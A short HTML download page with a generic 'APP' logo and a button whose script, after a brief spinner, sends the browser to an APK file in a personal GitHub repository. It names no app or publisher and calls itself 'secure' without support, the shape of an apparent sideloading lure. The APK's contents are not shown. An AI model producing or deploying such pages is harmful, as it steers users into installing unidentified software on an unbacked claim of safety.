<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Download App</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Arial,sans-serif}
body{background:#f4f7fb;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{width:100%;max-width:390px;background:#fff;border-radius:22px;padding:28px 24px;text-align:center;box-shadow:0 12px 35px rgba(0,0,0,.12)}
.logo{width:75px;height:75px;border-radius:18px;background:#0b5ed7;color:#fff;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;margin:0 auto 16px}
h1{color:#0b3b8f;font-size:25px;margin-bottom:8px}
p{color:#555;font-size:14px;line-height:1.5;margin-bottom:22px}
.btn{width:100%;height:56px;border:0;border-radius:14px;background:#0b5ed7;color:white;font-size:19px;font-weight:900;cursor:pointer}
.wait{display:none;margin-top:15px;color:#0b3b8f;font-weight:bold}
.spin{width:20px;height:20px;border:3px solid #ddd;border-top:3px solid #0b5ed7;border-radius:50%;display:inline-block;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{100%{transform:rotate(360deg)}}
.note{margin-top:16px;background:#f3f4f6;border-radius:12px;padding:12px;font-size:12px;color:#555}
</style>
</head>
<body>

<div class="box">
<div class="logo">APP</div>
<h1>Download App</h1>
<p>Tap the button below to download the app.</p>

<button class="btn" onclick="downloadApp()">⬇ Download App</button>

<div class="wait" id="wait">
<span class="spin"></span>Please wait, download starting...
</div>

<div class="note">Secure app download page.</div>
</div>

<script>
function downloadApp(){
 document.getElementById("wait").style.display="block";
 setTimeout(function(){
  window.location.href="https://github.com/Rahul8991-123/opennow/releases/download/V1/signed.apk";
 },800);
}
</script>

</body>
</html>
